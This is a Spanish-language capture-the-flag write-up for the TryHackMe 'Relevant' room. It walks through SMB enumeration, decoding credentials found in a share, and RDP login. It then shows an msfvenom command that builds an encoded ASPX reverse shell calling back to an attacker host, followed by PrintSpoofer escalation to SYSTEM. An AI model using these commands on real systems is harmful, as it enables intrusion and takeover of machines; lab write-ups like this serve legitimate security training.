# Relevant - TryHackMe

**IP:** 10.10.113.171

## Reconocimiento Inicial

### Ping
```bash
ping -c 1 10.10.113.171
```
- `ttl=127`: Sistema objetivo probablemente **Windows**

### Nmap
```bash
nmap -sC -sV -p- -oN nmap -v 10.10.113.171
```
- Escaneo completo de puertos y detección de versiones.

## Descubrimiento de Recursos Web
```bash
sudo wfuzz -c -L -t 400 --sc=200,301 -w directory-list-2.3-medium.txt http://10.10.113.171/FUZZ
```
- Descubrimiento de rutas ocultas en servidor HTTP IIS.

## Enumeración SMB
```bash
smbclient -L 10.10.113.171
```
- Recursos encontrados:
  - `ADMIN$`
  - `C$`
  - `IPC$`
  - `nt4wrksv`

### Acceso a nt4wrksv
```bash
smbclient //10.10.113.171/nt4wrksv
```
- Archivo interesante: `passwords.txt`

### Contenido de passwords.txt
```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
- Decodificado con CyberChef:
  - `Bill : Juw4nnaM4n420696969!$$$`

## Acceso vía RDP
```bash
xfreerdp /u:RELEVANT\BILL /p:'Juw4nnaM4n420696969!$$$' /v:10.10.38.87
```

## Servidor Web IIS
- Probamos ruta compartida desde web:
```http
http://10.10.38.87:49663/nt4wrksv/passwords.txt
```

## Payload ASPX con msfvenom
```bash
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.2.17.74 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```
- Subida mediante SMB/Web compartido.
- Activación con navegador.

## Escalada de Privilegios
- Uso de **PrintSpoofer** (`SeCreateGlobalPrivilege`):
  - Subida y ejecución del binario `PrintSpoofer.exe`.
  - Obtención de shell como `NT AUTHORITY\SYSTEM`.

### Búsqueda de flags
```cmd
cd /
dir *.exe /s /p
type root.txt
```
